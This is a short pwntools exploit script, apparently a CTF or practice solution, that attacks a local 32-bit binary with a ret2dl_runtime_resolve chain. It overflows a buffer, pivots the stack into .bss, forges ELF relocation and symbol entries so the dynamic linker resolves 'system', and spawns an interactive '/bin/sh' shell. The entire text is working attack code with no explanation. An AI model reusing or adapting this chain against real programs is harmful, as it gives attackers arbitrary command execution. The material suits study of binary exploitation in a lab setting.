from pwn import *

p = process("./ret2_dl_runtime_resolve")
gdb.attach(p,"b *0x08048557")
elf = ELF("./ret2_dl_runtime_resolve")

ebp = 0x080485eb
leave_ret = 0x08048557
pop3 = 0x080485e9
bss_addr = 0x0804A900
rop_addr = bss_addr
cmd = "/bin/sh\x00"
cmd_addr = bss_addr + 0x200
plt0 = 0x08048380
write_index = 0x10

fake_reloc = p32(0x804A014) + p32(0x407)
fake_reloc_addr = bss_addr + 0x100
fake_write_index = fake_reloc_addr - 0x0804833C
align = "\x00" * 0xc
fake_sym = align + p32(0x4d) + p32(0) + p32(0) + p32(0x12) + p32(0) + p32(0)
fake_sym_addr = bss_addr + 0x120
symtab = 0x080481DC
fake_r_info = ((fake_sym_addr + len(align)) - symtab) * 0x10 + 0x7
fake_reloc = p32(0x804A014) + p32(fake_r_info)

strtab = 0x0804827C
st_name_addr = bss_addr + 0x180
fake_st_name = "write"
fake_st_name = "system"
fake_st_name_index = st_name_addr - strtab
fake_sym = align + p32(fake_st_name_index) + p32(0) + p32(0) + p32(0x12) + p32(0) + p32(0)

p.recvuntil("ret2_dl_runtime_resolve\n")
payload1 = "a" * 0x108 + "junk"
payload1 += p32(elf.plt["read"]) + p32(pop3) + p32(0) + p32(bss_addr) + p32(0x500)
payload1 += p32(ebp) + p32(rop_addr - 4)
payload1 += p32(leave_ret)
payload1 = payload1.ljust(0x200,"\x00")
p.send(payload1)

#rop_data = p32(plt0) + p32(fake_write_index) + p32(pop3) + p32(1) + p32(cmd_addr) + p32(8)
rop_data = p32(plt0) + p32(fake_write_index) + p32(pop3) + p32(cmd_addr)#p32(1) + p32(cmd_addr) + p32(8)
rop_data = rop_data.ljust(0x100,"\x00")
rop_data += fake_reloc
rop_data = rop_data.ljust(0x120,"\x00")
rop_data += fake_sym
rop_data = rop_data.ljust(0x180,"\x00")
rop_data += fake_st_name
rop_data = rop_data.ljust(0x200,"\x00")
rop_data += cmd
rop_data = rop_data.ljust(0x500,"\x00")
assert len(rop_data) <= 0x500
p.send(rop_data)

p.interactive()
